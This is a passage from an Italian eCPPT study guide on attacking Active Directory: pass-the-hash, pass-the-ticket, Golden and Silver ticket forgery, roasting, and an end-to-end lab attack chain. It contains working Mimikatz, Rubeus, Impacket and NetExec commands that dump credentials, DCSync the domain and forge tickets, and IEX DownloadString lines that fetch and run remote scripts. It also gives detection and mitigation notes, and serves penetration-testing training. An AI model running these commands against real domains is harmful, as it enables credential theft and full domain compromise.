netexec smb <target> -u Administrator -H <NT_HASH>

# Impacket
impacket-psexec research.security.local/Administrator@<DC_IP> -hashes :<NT_HASH>
impacket-wmiexec -hashes :<NT_HASH> Administrator@<DC_IP>
impacket-smbexec -hashes :<NT_HASH> Administrator@<DC_IP>

# Evil-WinRM
evil-winrm -i <target> -u Administrator -H <NT_HASH>
```

#### Prerequisiti per dumpare LSASS
- **Admin locale** + `SeDebugPrivilege` (LSASS è protetto).
- Sequenza Mimi⁠katz canonica: `privilege::de⁠bug` → `token::elevate` → `sekur⁠lsa::logonpasswords`.

#### Note
- Format hash spesso `:<NThash>` (con LM vuoto) in tool come psexec.py.
- **PSRemoting (WinRM 5985/5986)** è il canale standard di lateral con cred impersonate.

### 7.2 Pass-the-Ticket (PtT) — Kerberos

#### Concept
Riusare un **ticket Kerberos rubato** (TGT o TGS) per autenticarsi come un altro utente senza conoscere la password.

#### Cosa puoi rubare in base ai privilegi

| Privilegi | Ticket accessibili | Tecniche |
|---|---|---|
| **User normale** | I propri TGS, TGT via *fake delegation* | Limitato al proprio user |
| **Admin / SYSTEM** | Tutti i TGT/TGS in LSASS di tutti i loggati | `sekur⁠lsa::tickets`, `sekur⁠lsa::tickets /export` |

#### TGT vs TGS rubato
- **TGT** = "passepartout" → riusabile per richiedere TGS per qualsiasi servizio nel dominio. Più potente.
- **TGS** = vincolato al servizio specifico. Più limitato.

#### Workflow lab
```powershell
# === Foothold elevated sul client ===
powershell -ep bypass
cd C:\Tools
. .\Power⁠View.ps1
Find-LocalAdminAccess
# -> seclogs, client

# === Remoting al pivot ===
Enter-PSSession -ComputerName seclogs.research.security.local
whoami /priv

# === Da seclogs: carica Mimi⁠katz via HFS ===
I⁠EX(New-Object Net.Web⁠Client).Download⁠String("http://10.0.5.101/Invoke-Mi⁠mi⁠katz.ps1")

# === Esporta TUTTI i ticket Kerberos cached ===
Invoke-Mi⁠mi⁠katz -Command '"sekur⁠lsa::tickets /export"'
ls *.kirbi | Select Name
# es. [0;3e7]-2-1-40e10000-Maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi

# === Pass-the-Ticket: inject del TGT di Maintainer (DA) ===
Invoke-Mi⁠mi⁠katz -Command '"kerberos::p⁠tt [0;3e7]-2-1-40e10000-Maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"'

# === Verifica ===
klist
ls \\prod.research.security.local\C$    # ✓ accesso al DC
```

#### Alternative
```powershell
# Rub⁠eus (sostituto moderno di Mimi⁠katz per Kerberos)
Rub⁠eus.exe dump                              # lista ticket
Rub⁠eus.exe ptt /ticket:<base64_or_kirbi>     # pass-the-ticket
```
```bash
# Linux con un .ccache
export KRB5CCNAME=/path/to/maintainer.ccache
impacket-psexec -k -no-pass research.security.local/maintainer@prod.research.security.local
```

#### Ticket attributes utili (output `klist`)
- **Start/End/Renew time** — default TGT: 10h, renew 7 giorni.
- **Flags** — `forwardable, renewable, pre_authent, ...`.
- **EncryptionType** — `aes256_hmac` moderno; `rc4_hmac` legacy/spoof-friendly.
- **Server** — per un TGT è `krbtgt/DOMAIN`.

#### PtT vs Overpass-the-Hash
- **PtT** = ticket **già emesso** rubato.
- **Overpass-the-Hash (OPtH)** = usa **NT hash** per richiedere un nuovo TGT al KDC.

#### PtH vs PtT (combo memoria)

| Aspetto | PtH | PtT |
|---|---|---|
| Materiale | NT hash | Ticket Kerberos (.kirbi/.ccache) |
| Protocollo | NTLM | Kerberos |
| Funziona se NTLM disabilitato | No | Sì |
| Tool tipici | Mimi⁠katz `pth`, psexec.py, evil-winrm, CME | Mimi⁠katz `ptt`, Rub⁠eus `ptt` |
| Detection | 4624 logon NTLM, mancanza di 4768 | TGT non corrispondente a un AS-REQ, RC4 anomalo |

---

## PARTE 8 — PERSISTENCE

### 8.1 Golden Ticket

#### Concept
TGT **forgiato** cifrato con l'**NTLM hash dell'account `KRBTGT`**. Chi possiede l'hash di KRBTGT può forgiare un TGT per **qualsiasi utente, qualsiasi gruppo, qualsiasi validità** (default Mimi⁠katz: 10 anni).

È la forma più potente di persistence in AD: sopravvive a cambi password, reset, revocazioni. Si neutralizza **solo resettando KRBTGT due volte** (perché AD mantiene la "previous key" per gestire ticket in flight).

#### Prerequisiti
- **NTLM hash di KRBTGT** (richiede DA o **DCSync rights** = `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`).
- **SID del dominio** (NB: senza `-500` finale!).

#### Workflow del lab — chain completa
```
[student@client elevated]
  └─ Mimi⁠katz: sekur⁠lsa::logonpasswords
       └─ Dump NTLM Administrator
            └─ sekur⁠lsa::pth Administrator
                 └─ Nuovo cmd come Administrator (DA)
                      └─ lsa⁠dump::lsa /patch /computer:<DC>      (DCSync-like)
                           └─ Dump NTLM hash di KRBTGT
                                └─ kerberos::gol⁠den /ptt
                                     └─ klist (verifica TGT forgiato)
                                          └─ dir \\prod.\C$  ✓
```

#### Step-by-step
```powershell
# === Setup ===
powershell -ep bypass
cd C:\Tools
. .\Power⁠View.ps1
. .\Invoke-Mi⁠mi⁠katz.ps1

# === 0. Baseline: NESSUN accesso al DC ===
dir \\prod.research.security.local\C$    # Access is denied

# === 1. Dump credenziali ===
Invoke-Mi⁠mi⁠katz -Command '"privilege::de⁠bug" "sekur⁠lsa::logonpasswords"'
# Annota: Administrator NTLM, Domain SID (S-1-5-21-xxxx-yyyy-zzzz)

# === 2. PtH come Administrator (per fare DCSync) ===
Invoke-Mi⁠mi⁠katz -Command '"sekur⁠lsa::pth /user:Administrator /domain:research.security.local /ntlm:<ADMIN_NT>"'

# === 3. Da nuovo cmd impersonato: dump KRBTGT ===
powershell -ep bypass
. .\Invoke-Mi⁠mi⁠katz.ps1
Invoke-Mi⁠mi⁠katz -Command '"lsa⁠dump::lsa /patch /computer:prod.research.security.local"'
# Annota: krbtgt NTLM

# === 4. Forgia Golden Ticket ===
Invoke-Mi⁠mi⁠katz -Command '"kerberos::gol⁠den /user:Administrator /domain:research.security.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# === 5. Verifica ===
klist
dir \\prod.research.security.local\C$    # ✓ accesso

# === In caso di errore SID ===
klist purge
# poi rigenerare con il SID corretto
```

#### Parametri di `kerberos::gol⁠den`

| Param | Valore | Significato |
|---|---|---|
| `/user` | Qualunque (anche fittizio) | Username da impersonare |
| `/domain` | FQDN | Dominio target |
| `/sid` | **SID del DOMINIO** | **Senza** il `-RID` finale (errore tipico!) |
| `/krbtgt` | NTLM hash di krbtgt | Chiave maestra |
| `/id` | 500 | RID utente (500=Administrator) |
| `/groups` | 513,512,520,518,519 | RID gruppi nel PAC (512=DA, 519=EA) |
| `/startoffset` | 0 | Inizio (minuti, offset da ora) |
| `/endin` | 600 (default 10 anni se omesso) | Durata in minuti |
| `/renewmax` | 10080 (7 giorni in min) | Max renew |
| `/ptt` | flag | Inietta direttamente in memoria |

#### Errore del video (lesson learned)
Alexis al primo tentativo passa come `/sid` il SID **dell'admin** (che finisce in `-500`). Il KDC rifiuta. Soluzione: `klist purge` + rigenerare con il **SID del dominio** (rimuovere il RID finale).

#### Alternativa cross-platform
```bash
# DCSync per krbtgt
impacket-secretsdump research.security.local/Administrator@<DC_IP> \
    -hashes :<ADMIN_NT> -just-dc-user krbtgt

# Forgia
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid <DOMAIN_SID> \
    -domain research.security.local Administrator

# Uso
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass research.security.local/Administrator@prod.research.security.local
```

#### Detection del Golden Ticket
- TGT con encryption **RC4** di default (anomalia se il dominio usa AES).
- Lifetime anomalo (10 anni).
- **Assenza dell'AS-REQ corrispondente** (TGT esiste senza essere mai stato richiesto al KDC).
- Mitigation: double-reset di KRBTGT, monitoring eventi 4769 con TGT non tracciato.

### 8.2 Silver Ticket

#### Concept
TGS **forgiato** per uno specifico servizio su uno specifico host, cifrato con l'**NTLM hash dell'account del servizio** (computer account o user service account).

A differenza del Golden: **NON interagisce con il KDC** (è presentato direttamente al servizio target) → più stealth, nessun evento sul DC.

#### Perché funziona
La **PAC validation è OPZIONALE** e di default disabilitata. Il servizio si fida del PAC del ticket. Quindi un Silver con `/user:Administrator /groups:512` ottiene DA-like access **su quel servizio**.

#### SPN class names rilevanti

| Service class | Cosa permette |
|---|---|
| `CIFS` | Accesso share SMB (file server) |
| `HOST` | "Tutto" su quel computer (scheduled tasks, services) |
| `HTTP` | Servizi web (IIS, WinRM) |
| `LDAP` | Query AD / DCSync se DC |
| `MSSQLSvc` | SQL Server |
| `RPCSS` | RPC / WMI |
| `WSMAN` | WinRM |
| `TIME` | Time service |

Per **WinRM/PSRemoting** servono tipicamente **due** silver: `HOST` + `HTTP`. Per share SMB basta `CIFS`.

#### Workflow del lab
```powershell
# === Setup foothold ===
powershell -ep bypass
cd C:\Tools
. .\Power⁠View.ps1
Get-Domain
Get-DomainSID                 # ANNOTA: S-1-5-21-...
Find-LocalAdminAccess         # -> seclogs

# === Remoting al pivot ===
Enter-PSSession -ComputerName seclogs.research.security.local
whoami /priv

# === Dal pivot: dump admin loggato ===
I⁠EX(New-Object Net.Web⁠Client).Download⁠String("http://10.0.5.101/Invoke-TokenManipulation.ps1")
Invoke-TokenManipulation -Enumerate     # Administrator type 2

I⁠EX(New-Object Net.Web⁠Client).Download⁠String("http://10.0.5.101/Invoke-Mi⁠mi⁠katz.ps1")
Invoke-Mi⁠mi⁠katz -Command '"privilege::de⁠bug" "token::elevate" "sekur⁠lsa::logonpasswords"'
# Annota NTLM Administrator
Exit-PSSession

# === Sul client, nuova shell as Admin: PtH come DA ===
powershell -ep bypass
. .\Invoke-Mi⁠mi⁠katz.ps1
Invoke-Mi⁠mi⁠katz -Command '"sekur⁠lsa::pth /user:Administrator /domain:research.security.local /ntlm:<ADMIN_NT> /run:powershell.exe"'

# === Nella shell DA: estrai hash computer account del DC ===
powershell -ep bypass
. .\Invoke-Mi⁠mi⁠katz.ps1
Invoke-Mi⁠mi⁠katz -Command '"lsa⁠dump::lsa /inject /name:PROD$"'
# (alternativa: /computer:prod.research.security.local)
# Annota NTLM di PROD$

# Baseline
ls \\prod.research.security.local\C$    # Access denied

# === Forgia Silver Ticket per CIFS del DC ===
Invoke-Mi⁠mi⁠katz -Command '"kerberos::gol⁠den /domain:research.security.local /sid:<DOMAIN_SID> /target:prod.research.security.local /service:CIFS /rc4:<PROD_NT> /user:Administrator /ptt"'

# === Verifica ===
klist
ls \\prod.research.security.local\C$    # ✓ accesso
```

#### Note importanti su `kerberos::gol⁠den` (sì, lo stesso comando)
Mimi⁠katz usa `kerberos::gol⁠den` per **entrambi** i ticket — cambia solo cosa viene firmato:
- **Golden**: `/krbtgt:<hash>` (no `/service`, no `/target` perché è dominio-wide).
- **Silver**: `/service:<class>` + `/target:<host>` + `/rc4:<hash_service_account>` (no `/krbtgt`).

#### Perché serve l'hash di `PROD$` per `CIFS`
Il servizio CIFS gira sotto il computer account del DC (`PROD$`). Il TGS per `CIFS/prod.research.security.local` deve essere cifrato con la chiave di quel computer account. Per servizi user-context (es. MSSQL gestito da un service account) serve invece l'hash di quell'utente — **hash che si può ottenere anche via Kerberoasting!**

#### Alternativa cross-platform
```bash
# Recupera hash computer account via DCSync
impacket-secretsdump research.security.local/Administrator@<DC_IP> \
    -hashes :<ADMIN_NT> -just-dc-user 'PROD$'

# Forgia silver ticket
impacket-ticketer -nthash <PROD_NT> -domain-sid <DOMAIN_SID> \
    -domain research.security.local \
    -spn cifs/prod.research.security.local Administrator

# Uso
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass research.security.local/Administrator@prod.research.security.local
```

#### Mitigazione
- Ruotare regolarmente la password dei computer account critici (di default ogni 30 giorni, ma spesso disabilitato sui DC per stabilità).
- Per Silver basato su user service account: cambiare la password del service account regolarmente + password lunghe (per evitare Kerberoasting upstream).
- Abilitare PAC validation (impatto performance).

---

## PARTE 9 — CHEAT SHEET KERBEROS ATTACKS

> 📋 Le cheat sheet originalmente qui presenti sono state spostate nel modulo dedicato:
> - Tabella attacchi Kerberos + Hashcat modes + RID gruppi privilegiati → [Cheat Sheet — sezione Kerberos Attacks](../10_Cheatsheet.md#kerberos-attacks)
> - Mimi⁠katz mini-cheatsheet → [Cheat Sheet — sezione Mimi⁠katz](../10_Cheatsheet.md#mimi⁠katz)
> - Hashcat modes (consolidato con quelli del modulo Network) → [Cheat Sheet — sezione Hashcat — modes & cracking](../10_Cheatsheet.md#hashcat-modes-cracking)

---

## PARTE 10 — DIFFERENZE CHIAVE (TABELLA RIASSUNTIVA)

### 10.1 Golden vs Silver vs Pass-the-Ticket

| Aspetto | **Pass-the-Ticket (PtT)** | **Silver Ticket** | **Golden Ticket** |
|---|---|---|---|
| Tipo ticket | TGT o TGS **rubato** legittimo | TGS **forgiato** | TGT **forgiato** |
| Chiave necessaria | Nessuna (ticket già firmato) | NTLM hash del **service/computer account** | NTLM hash di **KRBTGT** |
| Scope | Dipende dal ticket rubato (un servizio o tutto il dominio) | **Singolo servizio** su singolo host | **Intero dominio** |
| KDC coinvolto? | Solo se TGT (per richiedere TGS) | **No** (presentato direttamente al servizio) | Sì (TGT forgiato → presenta al KDC per TGS) |
| Detection sul DC | Bassa-media (4624 senza 4768) | **Bassissima** (nessun evento) | Alta (4769 anomali, lifetime, RC4) |
| Persistence value | Limitata al lifetime del ticket (default 10h) | Medio (fino a rotation password account) | **Massimo** (fino a doppio reset KRBTGT) |
| Lifetime default | 10h (eredita dal ticket originale) | 10 anni (Mimi⁠katz default) | 10 anni (Mimi⁠katz default) |
| Mitigation | Monitor anomalie | Ruotare pw computer/service account | **Doppio reset di KRBTGT** |
| Tool tipico | Mimi⁠katz `kerberos::p⁠tt`, Rub⁠eus `ptt` | Mimi⁠katz `kerberos::gol⁠den /service` | Mimi⁠katz `kerberos::gol⁠den /krbtgt` |
| Caso d'uso | Lateral movement con cred fresh | Persistence stealth su servizio target | Dominance totale + persistence forte |

### 10.2 PtH vs PtT (lateral movement)

| Aspetto | **Pass-the-Hash** | **Pass-the-Ticket** |
|---|---|---|
| Materiale | NT hash | Ticket Kerberos (.kirbi/.ccache) |
| Protocollo abusato | NTLM/SMB | Kerberos |
| Funziona se NTLM disabled? | **No** | **Sì** |
| Funziona se solo NTLM (no Kerberos)? | Sì | No |
| Lifetime "utile" | Finché l'hash non cambia | Lifetime del ticket (default TGT: 10h, renew 7gg) |
| Tool Win | Mimi⁠katz `pth` | Mimi⁠katz `ptt`, Rub⁠eus `ptt` |
| Tool Linux | psexec.py, wmiexec.py, smbexec.py, CME, evil-winrm | impacket con `-k -no-pass` + KRB5CCNAME |
| Detection | 4624 logon NTLM senza interactive | TGS senza AS-REQ tracciato |

### 10.3 Kerberoasting vs AS-REP Roasting

(Già coperto in §6.3, ricapitolato qui per riferimento rapido)

| Aspetto | **Kerberoasting** | **AS-REP Roasting** |
|---|---|---|
| Target | Account con **SPN** | Account con **`DONT_REQ_PREAUTH`** |
| Hash ottenuto | TGS (key del service account) | AS-REP (key dell'utente) |
| Pre-requisito | Nessuna misconfig (nativo Kerberos) | Misconfig: preauth disabilitata |
| Credenziali necessarie | Sì (valid domain user) | No (bastano username) |
| Hashcat mode | `-m 13100` | `-m 18200` |
| Tool Windows | Rub⁠eus `kerberoast` | Rub⁠eus `asreproast` |
| Tool Linux | `GetUser⁠SPNs.py` | `GetNP⁠Users.py` |

---

## PARTE 11 — ATTACK FLOW COMPLETO (END-TO-END LAB)

Esempio di attack chain tipica eCPPT, partendo dall'assumed breach:

```
[1] FOOTHOLD (assumed breach)
    RDP/shell come `student` (low-priv domain user) su workstation joined
        │
        ▼
[2] HOST RECONNAISSANCE
    whoami /all ; net user /domain ; ipconfig /all
        │
        ▼
[3] DOMAIN ENUMERATION
    Blood⁠Hound: Invoke-Blood⁠Hound -CollectionMethod All
    Power⁠View: Get-NetGroupMember "Domain Admins"
               Get-DomainUser -SPN
               Get-DomainUser -PreauthNotRequired
               Find-LocalAdminAccess
               Find-InterestingDomainAcl
        │
        ├──── PATH A: AS-REP Roasting (se utenti vulnerabili) ─────┐
        │     Rub⁠eus asreproast → hashcat -m 18200 → password      │
        │                                                          │
        ├──── PATH B: Kerberoasting (se account con SPN) ──────────┤
        │     Rub⁠eus kerberoast → hashcat -m 13100 → password      │
        │                                                          │
        ├──── PATH C: Password Spraying ─────────────────────────── ┤
        │     Invoke-DomainPasswordSpray                            │
        │                                                          │
        └──── PATH D: ACL abuse (GenericAll, WriteDACL, ecc.) ──────┘
                                                                   │
                                                                   ▼
[4] CREDENZIALI / SHELL come user piu' privilegiato
    O service account con privs alti
        │
        ▼
[5] LATERAL MOVEMENT
    Find-LocalAdminAccess → PSRemoting → dump LSASS → NTLM hash DA
        ├─ Pass-the-Hash (Mimi⁠katz sekur⁠lsa::pth)
        └─ Pass-the-Ticket (sekur⁠lsa::tickets /export → kerberos::p⁠tt)
        │
        ▼
[6] DOMAIN ADMIN
    Enter-PSSession <DC> ; whoami → DOMAIN\Administrator
        │
        ▼
[7] PERSISTENCE
    DCSync krbtgt (lsa⁠dump::lsa /patch o impacket-secretsdump)
        ├─ Golden Ticket (kerberos::gol⁠den /krbtgt) — dominio-wide, 10 anni
        └─ Silver Ticket (kerberos::gol⁠den /service:<X> /rc4:<svc_NT>) — stealth, singolo servizio
        │
        ▼
[8] CROSS-TRUST (se forest trust presente)
    Get-NetForestTrust → enumerare dominio trusted → Golden Ticket inter-realm
        │
        ▼
[9] EXFILTRATION (out of scope corso)
```

---

## PARTE 12 — PUNTI D'ATTENZIONE PER L'ESAME eCPPT (45 MCQ pratiche)

### 12.1 Domande quasi certe

1. **Sequenza Kerberos**: AS-REQ → AS-REP (TGT) → TGS-REQ → TGS-REP (TGS) → AP-REQ → AP-REP.
2. **Chi cifra cosa**: TGT con key di **KRBTGT**; TGS con key del **service account (SPN owner)**.
3. **Differenza Kerberoasting vs AS-REP Roasting** (target, hash mode, prerequisiti).
4. **Differenza Golden vs Silver Ticket** (chiave, scope, KDC).
5. **Differenza PtH vs PtT** (NTLM vs Kerberos).
6. **Power⁠View cmdlets**: `Get-DomainUser -SPN`, `-PreauthNotRequired`, `Find-LocalAdminAccess`, `Get-NetGroupMember "Domain Admins"`.
7. **Hashcat modes**: 13100 (Kerberoast), 18200 (AS-REP).
8. **Blood⁠Hound**: database = **Neo4j**; collector = **Sharp⁠Hound**; collection method = **`All`**.
9. **DCSync rights** = `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`.
10. **OU vs Container**: `Users`/`Computers` sono **container**, non OU → no GPO link diretto.
11. **Domain Admins** (RID 512, dominio) vs **Enterprise Admins** (RID 519, foresta).
12. **Trust intra-forest** = sempre two-way transitive di default.
13. **Direzione del trust** ≠ direzione dell'accesso (sono opposte).
14. **Password Spraying** = 1 password / molti utenti (vs brute force).
15. **Observation window** della Domain Password Policy → wait time tra cicli di spray.

### 12.2 Tranelli classici

- **SID del dominio vs SID dell'admin** in Golden Ticket: serve quello del **dominio** (senza `-500`/`-RID`).
- **`Users` e `Computers` non sono OU** (sono container CN=) → non si può linkare una GPO direttamente.
- **Pass-the-Hash** funziona con NTLM, NON con Kerberos puro (per Kerberos: PtT o OPtH).
- **AS-REP hash NON è NT hash**: va crackato per ottenere la password; non si può fare PtH diretto.
- **Skew temporale Kerberos**: ±5 min default. Senza clock sync, Kerberos fallisce.
- **PAC validation è opzionale**: motivo per cui Silver Ticket funziona.
- **Golden Ticket si "neutralizza" solo con doppio reset di KRBTGT**.
- **Mimi⁠katz `kerberos::gol⁠den`** è usato sia per Golden sia per Silver — distinzione via parametri.
- **Get-DomainUser -SPN** (Kerberoastable) vs **-PreauthNotRequired** (AS-REP).
- **Enumeration AD richiede solo un domain user qualsiasi**: l'LDAP è leggibile da chiunque autenticato.

### 12.3 Vocabolario tool da padroneggiare

- **Power⁠View** (enum AD manuale)
- **Blood⁠Hound + Sharp⁠Hound** (enum grafica)
- **DomainPasswordSpray** (Dafthack) / **kerbrute** / **CrackMapExec/NetExec** (spray)
- **Rub⁠eus** (Kerberos all-in-one: asreproast, kerberoast, dump, ptt, asktgt, asktgs)
- **Mimi⁠katz / Invoke-Mi⁠mi⁠katz** (creds + tickets + DCSync)
- **impacket suite**:
  - `GetNP⁠Users.py` (AS-REP)
  - `GetUser⁠SPNs.py` (Kerberoast)
  - `secrets⁠dump.py` (DCSync, SAM dump)
  - `psexec.py`, `wmiexec.py`, `smbexec.py` (lateral)
  - `ticketer.py` (Golden/Silver)
  - `getTGT.py`, `getST.py` (OPtH, S4U)
- **Evil-WinRM** (WinRM shell con hash o password)
- **hashcat** + **John the Ripper** (crack)
- **Responder** / **mitm6** (NTLM relay/poisoning — modulo Network)

---

## PARTE 13 — APPENDICE — COMANDI ONE-LINER UTILI

### 13.1 Enumeration rapida (Power⁠View)
```powershell
# Tutto in un colpo solo
Get-Domain; Get-DomainController; Get-DomainSID
Get-NetGroupMember "Domain Admins" | Select MemberName
Get-NetGroupMember "Enterprise Admins" | Select MemberName
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
Get-DomainUser -PreauthNotRequired | Select SamAccountName
Find-LocalAdminAccess
Get-NetDomainTrust; Get-NetForestTrust
Find-InterestingDomainAcl -ResolveGUIDs | Select IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

### 13.2 Kerberos attacks one-liner
```powershell
# AS-REP Roast (Rub⁠eus)
.\Rub⁠eus.exe asreproast /format:hashcat /outfile:asrep.hashes

# Kerberoast (Rub⁠eus)
.\Rub⁠eus.exe kerberoast /format:hashcat /outfile:tgs.hashes

# Dump tickets correnti
.\Rub⁠eus.exe dump

# Pass-the-Ticket
.\Rub⁠eus.exe ptt /ticket:<base64>

# Overpass-the-Hash (richiede nuovo TGT)
.\Rub⁠eus.exe asktgt /user:Administrator /rc4:<NT_HASH> /ptt
```

### 13.3 Mimi⁠katz full chain
```powershell
. .\Invoke-Mi⁠mi⁠katz.ps1
Invoke-Mi⁠mi⁠katz -Command '"privilege::de⁠bug" "token::elevate" "sekur⁠lsa::logonpasswords" "sekur⁠lsa::tickets /export" "lsa⁠dump::lsa /patch"'
```

### 13.4 Impacket (Linux) golden/silver
```bash
# Golden
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid <SID> -domain <dom> Administrator
# Silver
impacket-ticketer -nthash <SVC_NT> -domain-sid <SID> -domain <dom> \
                  -spn cifs/<host> Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <dom>/Administrator@<host>
```

### 13.5 CrackMapExec / NetExec
```bash
# Validazione cred su tutto un /24
netexec smb 10.0.5.0/24 -u Administrator -H <NT_HASH>
# Spray
netexec smb <DC_IP> -u userlist.txt -p Password123
# Dump SAM remoto
netexec smb <host> -u Admin -H <NT_HASH> --sam
# Dump LSA secrets
netexec smb <host> -u Admin -H <NT_HASH> --lsa
# DCSync via NetExec
netexec smb <DC> -u Admin -H <NT_HASH> --ntds
```

### 13.6 Blood⁠Hound — Cypher queries utili
```cypher
// Domain Admins
MATCH (n:Group) WHERE n.name CONTAINS "DOMAIN ADMINS" RETURN n

// Kerberoastable
MATCH (n:User {hasspn:true}) RETURN n

// AS-REP Roastable
MATCH (n:User {dontreqpreauth:true}) RETURN n

// DCSync rights
MATCH (n)-[:GetChanges|GetChangesAll]->(:Domain) RETURN n

// Shortest path da owned a DA
MATCH (n {owned:true}), (m:Group), p=shortestPath((n)-[*1..]->(m))
WHERE m.name CONTAINS "DOMAIN ADMINS"
RETURN p
```

---

## PARTE 14 — RIFERIMENTI ESTERNI

- **Orange Cyber Defense Active Directory Mind Maps** (SVG zoomabile) — flow chart contestuale di tecniche e tool.
- **HackTricks** — sezione Active Directory.
- **Specter Ops "An ACE Up the Sleeve"** — paper su ACL abuse.
- **Will Schroeder (harmj0y)** — papers su Kerberos attacks e Power⁠View.
- **Sean Metcalf (ADSecurity.org)** — riferimento per Kerberos defender + attacker side.
- **GitHub**:
  - `PowerShellMafia/Power⁠Sploit` (Power⁠View, Invoke-Mi⁠mi⁠katz)
  - `Blood⁠HoundAD/Blood⁠Hound` + `Sharp⁠Hound`
  - `GhostPack/Rub⁠eus`
  - `gentilkiwi/mimi⁠katz`
  - `fortra/impacket`
  - `Pennyw0rth/NetExec` (fork mantenuto di CrackMapExec)
  - `dafthack/DomainPasswordSpray`
  - `ropnop/kerbrute`

---

## CHIUSURA

Questo modulo è il cuore dell'esame eCPPT 2024 lato Windows enterprise. La memoria operativa minima richiesta:

1. **Saper enumerare** con Blood⁠Hound + Power⁠View (priorità: DA membership, SPN, preauth flag, ACL, trust, `Find-LocalAdminAccess`).
2. **Saper eseguire AS-REP Roasting e Kerberoasting** con Rub⁠eus o impacket, conoscendo i due hash mode (18200 / 13100).
3. **Saper fare lateral movement** con PtH (Mimi⁠katz `sekur⁠lsa::pth` o `evil-winrm -H` o `psexec.py -hashes`) e PtT (`kerberos::p⁠tt`).
4. **Saper forgiare Golden e Silver Ticket** con Mimi⁠katz `kerberos::gol⁠den`, sapendo distinguere i parametri (`/krbtgt` vs `/service`+`/target`+`/rc4`) e il **SID corretto** (dominio, non admin).
5. **Memorizzare le tabelle differenze**: Golden vs Silver vs PtT, PtH vs PtT, Kerberoasting vs AS-REP.

Buono studio.
